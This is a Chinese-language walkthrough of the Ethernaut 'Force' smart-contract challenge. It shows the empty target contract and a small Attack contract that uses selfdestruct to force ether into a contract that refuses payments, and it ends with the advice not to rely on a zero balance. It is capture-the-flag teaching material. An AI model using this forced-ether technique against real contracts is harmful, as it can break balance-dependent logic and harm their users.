# Force

> 有些合约就是拒绝你的付款,就是这么任性 `¯\_(ツ)_/¯`
>
> 这一关的目标是使合约的余额大于0

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## 攻击思路

如果直接给合约转账，会报错：rror in RPC response:,execution reverted

在合约不接受转账（未实现fallback和receive函数）时，如果强制给合约账户进行转账？

在日常进行solidity开发时，有时能看到这样的报错

```
Invalid implicit conversion from address to address payable requested.
```

即某个地址不具备payable属性，这时一般就会进行强转：

```
payable(_address)
```

### selfdestruct

The `selfdestruct(address)` function removes all bytecode from the contract address and sends all ether stored to the specified address. If this specified address is also a contract, <u>**no functions (including the fallback) get called**</u>.



[How to Hack Smart Contracts: Self Destruct and Solidity](https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity)

[Intro to Smart contract exploits: Selfdestruct function](https://slowmist.medium.com/intro-to-smart-contract-exploits-selfdestruct-function-14c10ca00bb6)

攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack {

   function attack(address _address) public payable {
       selfdestruct(payable(_address));
   }
}
```

在solidity中, 如果一个合约要接受 ether, fallback 方法必须设置为 `payable`.

但是, 并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 `address(this).balance == 0` 之上.